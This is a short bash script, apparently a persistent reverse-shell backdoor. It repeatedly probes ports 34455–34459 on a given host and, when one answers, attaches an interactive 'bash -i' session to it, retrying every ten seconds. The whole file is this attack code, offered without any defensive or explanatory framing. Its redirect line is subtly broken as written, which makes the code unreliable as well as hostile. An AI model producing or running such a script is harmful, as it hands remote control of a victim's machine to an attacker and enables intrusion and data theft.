TARGET="${1}"
PORTS=("34455" "34456" "34457" "34458" "34459")

port_reachable() {
    local port="${1}"
    if timeout 0.5 bash -c "</dev/tcp/${TARGET}/${port}" 2> /dev/null; then # command for tcp socket
        return 0
    else
        return 1
    fi
}

connect_reverse_shell() {
    local port="${1}"
    bash -i >& "</dev/tcp/${TARGET}/${port}" 0>&1 # >& redirects stdout and stderr to socket, 0>&1 redirects standard input to stdout's destination
}

while true; do
    for port in "${PORTS[@]}"; do 
        if port_reachable "${port}"; then
            echo "Port ${port} is reachable, attempting a connection..."
            connect_reverse_shell "${port}"
        else
            echo "Port ${port} not reachable."
        fi
    done
    echo "Trying again in 10 seconds..."
    sleep 10
done